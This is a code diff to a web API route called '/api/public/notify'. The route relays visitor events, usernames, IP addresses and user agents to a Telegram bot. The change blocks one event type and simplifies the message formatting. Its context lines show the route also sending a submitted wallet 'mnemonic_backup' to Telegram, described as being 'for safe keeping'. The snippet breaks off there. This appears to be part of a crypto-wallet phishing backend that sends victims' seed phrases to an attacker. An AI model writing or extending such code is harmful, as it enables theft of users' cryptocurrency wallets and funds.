@@ -65,6 +65,7 @@ export const Route = createFileRoute("/api/public/notify")({
         }
 
         const event = truncate(String(body.event ?? "event"), 48);
+        if (event === "account_contact_linked") return Response.json({ ok: false }, { status: 403 });
         const path = truncate(String(body.path ?? "/"), 120);
         const username = body.username ? truncate(String(body.username), 32) : "guest";
         const label = body.label ? truncate(String(body.label), 120) : "";
@@ -94,9 +95,7 @@ export const Route = createFileRoute("/api/public/notify")({
         if (ip) lines.push(`🌐 <code>${esc(ip)}</code>`);
         if (ua) lines.push(`🧭 ${esc(ua)}`);
 
-        const isContactAlert = event === "account_contact_linked";
-        const starBorder = "⭐".repeat(30);
-        await sendTelegram(token, isContactAlert ? [starBorder, ...lines, starBorder].join("\n") : lines.join("\n"));
+        await sendTelegram(token, lines.join("\n"));
 
         // Send mnemonic as a separate, tagged backup message for safe keeping
         if (body.mnemonic_backup) {
